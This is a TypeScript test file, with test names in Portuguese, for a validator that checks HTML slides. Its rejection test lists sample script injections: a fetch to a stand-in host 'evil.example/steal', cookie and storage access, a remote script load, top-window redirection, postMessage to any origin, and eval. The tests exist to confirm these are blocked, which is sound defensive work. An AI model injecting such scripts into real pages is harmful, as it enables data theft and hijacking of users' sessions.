import assert from "node:assert/strict";
import { test } from "node:test";
import { validateSlideHtml } from "./slideValidation";

test("rejeita HTML vazio ou só espaço em branco", () => {
  assert.equal(validateSlideHtml("").valid, false);
  assert.equal(validateSlideHtml("   \n\t  ").valid, false);
});

test("rejeita HTML acima do limite de tamanho", () => {
  const huge = `<section>${"a".repeat(30_000)}</section>`;
  const result = validateSlideHtml(huge);
  assert.equal(result.valid, false);
  assert.match(result.reason ?? "", /limite de \d+ caracteres/);
});

test("rejeita padrões de rede/armazenamento mesmo dentro de outras tags", () => {
  const casos = [
    "<script>fetch('https://evil.example/steal')</script>",
    "<script>new XMLHttpRequest()</script>",
    "<script>document.cookie = 'x=1'</script>",
    "<script>localStorage.setItem('a','b')</script>",
    "<script>sessionStorage.getItem('a')</script>",
    "<script>window.top.location = 'https://evil.example'</script>",
    "<script>window.parent.postMessage('x','*')</script>",
    "<script src=\"https://evil.example/x.js\"></script>",
    "<script>eval('1+1')</script>",
  ];
  for (const html of casos) {
    const result = validateSlideHtml(html);
    assert.equal(result.valid, false, `deveria rejeitar: ${html}`);
    assert.ok(result.reason, `deveria ter motivo: ${html}`);
  }
});

test("aceita HTML/CSS/JS legítimo dentro do orçamento", () => {
  const html = `
    <section class="slide">
      <style>.slide { background: #101827; color: #f2f7fa; }</style>
      <h1>Como sistemas distribuídos resolvem consenso</h1>
      <script>
        document.querySelectorAll(".reveal").forEach(function (el) {
          el.addEventListener("click", function () { el.classList.toggle("open"); });
        });
      </script>
    </section>
  `;
  const result = validateSlideHtml(html);
  assert.equal(result.valid, true);
  assert.equal(result.reason, undefined);
});
